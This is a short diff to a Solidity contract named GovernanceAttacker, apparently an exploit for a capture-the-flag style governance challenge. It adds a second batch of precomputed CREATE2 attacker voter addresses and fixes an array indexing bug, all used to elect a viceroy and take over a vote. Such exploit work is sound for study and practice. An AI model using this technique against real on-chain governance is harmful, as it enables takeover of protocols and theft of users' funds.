@@ -132,7 +132,9 @@ contract GovernanceAttacker {
 
         uint nonce = 1;
         address[] memory preCalcedVotersA = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 0, 5);
+        address[] memory preCalcedVotersB = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 5, 10);
         address preCalcedViceroyA = getViceroyAddress(governance, proposal, preCalcedVotersA);
+        // address preCalcedViceroyB = getViceroyAddress(governance, proposal, preCalcedVotersB);
 
         // elect viceroy
         governance.appointViceroy(preCalcedViceroyA, nonce);
@@ -178,7 +180,7 @@ contract GovernanceAttacker {
     ) internal view returns (address[] memory) {
         address[] memory addresses = new address[](endIndex - startIndex);
         for (uint i = startIndex; i < endIndex; i++) {
-            addresses[i] = getCreate2Address(bytecode, i);
+            addresses[i - startIndex] = getCreate2Address(bytecode, i);
         }
         return addresses;
     }
